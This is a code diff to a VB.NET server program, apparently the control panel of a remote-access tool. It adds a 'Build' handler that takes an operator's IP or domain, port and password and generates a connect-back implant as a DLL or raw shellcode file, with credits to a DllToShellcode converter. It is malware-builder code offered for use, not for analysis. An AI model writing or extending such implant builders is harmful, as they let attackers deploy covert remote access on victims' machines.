@@ -1,6 +1,7 @@
 ﻿Imports System.Threading
 Imports System.Net
 Imports System.Net.Sockets
+Imports System.IO
 
 Public Class frmmain
     Public serverTCP As TcpListener
@@ -314,8 +315,59 @@ Public Class frmmain
                         "Elvis" & vbCrLf & vbCrLf &
                         "Library" & vbCrLf &
                         "zlib by Jean-loup Gailly and Mark Adler" & vbCrLf &
-                        "zlibnet by gdalsnes" & vbCrLf & vbCrLf &
+                        "zlibnet by gdalsnes" & vbCrLf &
+                        "VC-LTL by Chuyu Team" & vbCrLf &
+                        "DllToShellcode by Killeven" & vbCrLf & vbCrLf &
                         "Thank to" & vbCrLf &
                         "None"
+    End Sub
+
+    Private Sub cmdBuild_Click(sender As Object, e As EventArgs) Handles cmdBuild.Click
+        txtBuildLog.Text = "[+] Start building..." & vbCrLf
+        If txtBuildServer.Text.Length >= 50 Then
+            txtBuildLog.Text += "[-] IP/DnS too long (max 49)" & vbCrLf
+            Return
+        Else
+            txtBuildLog.Text += "[+] IP/DnS: " & txtBuildServer.Text & vbCrLf
+        End If
+        If Convert.ToInt32(txtBuildPort.Text) > 65535 Then
+            txtBuildLog.Text += "[-] Invalid port" & vbCrLf
+            Return
+        Else
+            txtBuildLog.Text += "[+] Port: " & txtBuildPort.Text & vbCrLf
+        End If
+        If txtPassword.Text.Length >= 20 Then
+            txtBuildLog.Text += "[-] Password too long (max 19)" & vbCrLf
+            Return
+        Else
+            txtBuildLog.Text += "[+] Password: " & txtPassword.Text & vbCrLf
+        End If
+        Dim buildObj As clsBuilder = New clsBuilder()
+
+        Dim buildBinary As Byte() = Nothing
+        If opBuildDll.Checked Then
+            buildBinary = buildObj.BuildDLL(txtBuildServer.Text, Convert.ToInt32(txtBuildPort.Text), txtPassword.Text)
+        ElseIf opBuildShell.Checked Then
+            buildBinary = buildObj.BuildShellcode(txtBuildServer.Text, Convert.ToInt32(txtBuildPort.Text), txtPassword.Text)
+        ElseIf opBuildCustom.Checked Then
+            MsgBox("Not support as this time", MsgBoxStyle.Critical, "Ops")
+            Return
+        End If
+        If buildBinary IsNot Nothing Then
+            Dim saveDialog As New SaveFileDialog()
+            saveDialog.Filter = "DLL files (*.dll)|*.dll|Bin files(*.bin)|*.bin|All files (*.*)|*.*"
+            saveDialog.FilterIndex = 2
+            saveDialog.RestoreDirectory = True
+            If saveDialog.ShowDialog() = DialogResult.OK Then
+                Dim fileStream As stream = saveDialog.OpenFile()
+                If fileStream IsNot Nothing Then
+                    fileStream.Write(buildBinary, 0, buildBinary.Length)
+                    txtBuildLog.Text += "[+] Save file to " & saveDialog.FileName & vbCrLf
+                    fileStream.Close()
+                Else
+                    txtBuildLog.Text += "[-] Failed to save file" & vbCrLf
+                End If
+            End If
+        End If
     End Sub
 End Class
